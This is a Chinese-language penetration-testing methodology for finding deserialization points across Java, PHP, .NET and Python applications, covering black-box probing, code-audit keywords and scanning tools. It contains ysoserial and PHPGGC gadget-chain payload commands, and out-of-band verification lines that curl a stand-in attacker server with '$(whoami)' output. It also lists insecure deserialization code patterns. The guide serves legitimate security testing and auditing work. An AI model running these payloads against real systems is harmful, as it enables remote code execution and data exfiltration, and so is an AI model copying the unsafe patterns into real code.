# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的反序列化点检测流程。通过本方法论，测试人员能够系统性地识别应用中的反序列化点，判断是否存在反序列化漏洞风险，并为后续漏洞验证提供基础。

## 1.2 适用范围

本文档适用于以下场景：
- Web 应用的反序列化点识别
- API 接口的反序列化点识别
- 移动应用的反序列化点识别
- 桌面应用的反序列化点识别
- 网络服务的反序列化点识别
- 代码审计中的反序列化点查找

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行代码审计的安全分析师
- 负责应用安全开发的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：反序列化点检测

### 2.1 技术介绍

反序列化点检测是识别应用中所有可能进行反序列化操作的入口点。准确识别反序列化点是进行反序列化漏洞测试的前提。

**常见反序列化场景：**
- 用户输入直接反序列化
- Cookie/Session 数据反序列化
- 缓存数据反序列化
- 消息队列数据反序列化
- 文件内容反序列化
- 网络通信数据反序列化
- 数据库存储数据反序列化

### 2.2 反序列化点常见位置

| 位置类型 | 具体场景 | 风险等级 |
|---------|---------|---------|
| **HTTP 参数** | GET/POST 参数直接反序列化 | 严重 |
| **Cookie** | Cookie 值包含序列化数据 | 严重 |
| **HTTP 头** | 自定义头包含序列化数据 | 高 |
| **Session** | Session 数据序列化存储 | 高 |
| **文件上传** | 上传的文件被反序列化 | 高 |
| **API 请求体** | JSON/XML 请求被反序列化 | 高 |
| **WebSocket** | WebSocket 消息反序列化 | 高 |
| **RPC 调用** | RMI/Remoting 调用 | 严重 |
| **消息队列** | JMS/RabbitMQ 消息 | 高 |
| **缓存** | Redis/Memcached 数据 | 中 - 高 |

### 2.3 检测方法

#### 2.3.1 黑盒检测

**HTTP 参数检测：**

1. **识别序列化特征**
   ```bash
   # Java 序列化特征 (Base64)
   # 以 rO0 开头
   curl "https://target.com/page?data=rO0ABX..."
   
   # PHP 序列化特征
   # O:<长度>:"<类名>"
   curl "https://target.com/page?user=O:4:%22User%22:1:{s:4:%22name%22;s:4:%22test%22;}"
   
   # .NET ViewState 特征
   # 以 /wEP 开头
   curl "https://target.com/page.aspx" | grep "__VIEWSTATE"
   
   # Python pickle 特征 (Base64)
   # 通常包含 (dp 开头
   curl "https://target.com/page?data=KGRw..."
   ```

2. **参数模糊测试**
   ```bash
   # 使用 Burp Suite Intruder
   # 测试所有参数点
   
   # 常见参数名
   data
   serialized
   object
   session
   user
   config
   state
   payload
   ```

3. **响应分析**
   ```bash
   # 观察异常响应
   # Java: java.io.InvalidClassException
   # PHP: unserialize(): Error at offset
   # .NET: SerializationException
   # Python: pickle.UnpicklingError
   
   # 观察时间延迟
   # 发送时间延迟 Payload 观察响应时间
   ```

**Cookie 检测：**

```bash
# 检查 Cookie 格式
curl -I https://target.com

# 常见序列化 Cookie 名
session
session_id
user_data
remember_me
state
csrf_token
```

**文件上传检测：**

```bash
# 上传包含序列化数据的文件
# 观察服务器处理后的响应

# 测试文件扩展名
.ser  # Java
.pkl  # Python pickle
.data # 通用
.bin  # 二进制
```

#### 2.3.2 白盒检测

**Java 代码审计：**

```java
// 搜索关键词
ObjectInputStream.readObject()
ObjectInputStream.readUnshared()
XMLDecoder.readObject()
XStream.fromXML()
YAML.load()
Gson.fromJson()  // 如果允许类型信息
ObjectMapper.readValue()  // 如果允许类型信息

// 危险模式示例
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();

XMLDecoder decoder = new XMLDecoder(inputStream);
Object obj = decoder.readObject();

XStream xstream = new XStream();
Object obj = xstream.fromXML(xmlString);
```

**PHP 代码审计：**

```php
// 搜索关键词
unserialize()
serialize()  // 配合查找用户输入点

// 危险模式示例
$data = unserialize($_GET['data']);
$data = unserialize($_POST['data']);
$data = unserialize($_COOKIE['data']);
$data = unserialize(file_get_contents($_FILES['upload']['tmp_name']));
```

**.NET 代码审计：**

```csharp
// 搜索关键词
BinaryFormatter.Deserialize()
XmlSerializer.Deserialize()
DataContractSerializer.ReadObject()
NetDataContractSerializer.Deserialize()
JavaScriptSerializer.Deserialize()  // 如果允许类型信息
JsonConvert.DeserializeObject()  // 如果允许类型信息

// 危险模式示例
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);

XmlSerializer serializer = new XmlSerializer(typeof(object));
object obj = serializer.Deserialize(stream);
```

**Python 代码审计：**

```python
# 搜索关键词
pickle.load()
pickle.loads()
yaml.load()  # 无 Loader 参数或使用 UnsafeLoader
marshal.load()
marshal.loads()
shelve.open()

# 危险模式示例
data = pickle.loads(user_input)
data = yaml.load(user_input)  # 应该使用 yaml.safe_load()
```

### 2.4 自动化工具检测

#### 2.4.1 Burp Suite 插件

**推荐插件：**
- **Java Serial Killer** - 检测 Java 反序列化点
- **PHP Object Injection** - 检测 PHP 反序列化点
- **Custom Payloads** - 自定义检测 Payload

**配置示例：**
```
# Java 序列化检测 Payload
AC ED 00 05 73 72 00 3A 6F 72 67 2E 61 70 61 63 68 65 2E 63 6F 6D 6D 6F 6E 73 2E 63 6F 6C 6C 65 63 74 69 6F 6E 73 2E 66 75 6E 63 74 6F 72 73 2E 49 6E 76 6F 6B 65 72 00
```

#### 2.4.2 命令行工具

**ysoserial 探测：**
```bash
# 生成探测 Payload
java -jar ysoserial.jar CommonsCollections1 "echo probe" > probe.bin

# 发送探测
curl -X POST https://target.com/api \
  --data-binary @probe.bin
```

**PHPGGC 探测：**
```bash
# 生成探测 Payload
php phpggc.php monolog/rce1 "echo probe"

# 发送探测
curl -X POST https://target.com/api.php \
  -d "data=生成的 Payload"
```

#### 2.4.3 自定义扫描脚本

```python
#!/usr/bin/env python3
import requests
import base64

# Java 序列化探测 Payload (Base64)
JAVA_PROBE = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAXx..."

# PHP 序列化探测 Payload
PHP_PROBE = 'O:4:"Test":1:{s:4:"name";s:4:"prob";}'

def probe_target(url, params):
    for param_name, payload in params.items():
        response = requests.get(url, params={param_name: payload})
        
        # 检查异常
        if "InvalidClassException" in response.text:
            print(f"[+] Java 反序列化点发现：{param_name}")
        if "unserialize()" in response.text:
            print(f"[+] PHP 反序列化点发现：{param_name}")
        if "SerializationException" in response.text:
            print(f"[+] .NET 反序列化点发现：{param_name}")

# 使用示例
probe_target("https://target.com/page", {"data": JAVA_PROBE})
```

### 2.5 检测结果验证

#### 2.5.1 时间延迟验证

```bash
# Java - 时间延迟 Payload
java -jar ysoserial.jar CommonsCollections5 "sleep 5" > delay.bin
curl -X POST https://target.com/api --data-binary @delay.bin
# 观察响应时间是否延迟 5 秒

# PHP - 时间延迟 Payload
php phpggc.php monolog/rce1 "sleep(5)"
# 发送后观察响应时间
```

#### 2.5.2 DNS/HTTP 外带验证

```bash
# DNS 外带
java -jar ysoserial.jar CommonsCollections1 "curl http://your-dnslog.com"
# 检查 DNSLog 是否收到请求

# HTTP 外带
java -jar ysoserial.jar CommonsCollections1 "curl http://your-server.com/$(whoami)"
# 检查服务器日志
```

#### 2.5.3 错误信息验证

```bash
# 发送无效序列化数据
# 观察错误信息判断反序列化类型

# Java 错误
java.io.InvalidClassException
java.io.StreamCorruptedException

# PHP 错误
unserialize(): Error at offset
unserialize(): Error

# .NET 错误
System.Runtime.Serialization.SerializationException
```

---

# 第三部分：附录

## 3.1 序列化格式特征速查

| 语言/框架 | 特征 | 示例 |
|----------|------|------|
| **Java** | AC ED (16 进制) / rO0 (Base64) | `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==` |
| **PHP** | O:<长度>:"<类名>" | `O:4:"User":1:{s:4:"name";s:4:"test";}` |
| **.NET ViewState** | /wEP 开头 | `/wEPDwUKMTYyOD...` |
| **Python Pickle** | ( 开头 (协议 0) / 二进制 | `(dp0\nS'name'\nVtest\ns.` |
| **Ruby Marshal** | \x04\x08 开头 | `\x04\bo:User...` |
| **YAML** | --- 开头 | `---\n!ruby/object:User` |

## 3.2 常见反序列化函数列表

### Java
| 函数/方法 | 库 | 风险 |
|----------|-----|------|
| `ObjectInputStream.readObject()` | JDK | 严重 |
| `XMLDecoder.readObject()` | JDK | 严重 |
| `XStream.fromXML()` | XStream | 严重 |
| `YAML.load()` | SnakeYAML | 严重 |
| `Gson.fromJson()` | Gson | 中 (配置相关) |

### PHP
| 函数 | 风险 |
|------|------|
| `unserialize()` | 严重 |
| `yaml_parse()` | 严重 |

### .NET
| 函数/方法 | 风险 |
|----------|------|
| `BinaryFormatter.Deserialize()` | 严重 |
| `XmlSerializer.Deserialize()` | 高 |
| `DataContractSerializer.ReadObject()` | 高 |

### Python
| 函数 | 风险 |
|------|------|
| `pickle.loads()` | 严重 |
| `yaml.load()` | 严重 |
| `marshal.loads()` | 高 |

## 3.3 反序列化点检测清单

- [ ] 所有 HTTP 输入点已测试
- [ ] 所有 Cookie 已检查
- [ ] 所有文件上传点已测试
- [ ] 所有 API 端点已检查
- [ ] 所有 WebSocket 端点已检查
- [ ] 所有 RPC 接口已检查
- [ ] 代码中反序列化函数已定位
- [ ] 依赖库中的反序列化已识别
- [ ] 缓存系统已检查
- [ ] 消息队列已检查

## 3.4 检测注意事项

1. **备份数据**：测试前备份重要数据
2. **测试环境**：尽可能在测试环境进行
3. **逐步验证**：从无害探测开始
4. **记录结果**：详细记录所有发现
5. **避免破坏**：避免发送破坏性 Payload
6. **合法授权**：确保有合法测试授权
7. **影响评估**：评估测试对业务的影响
8. **报告详细**：提供详细的检测报告
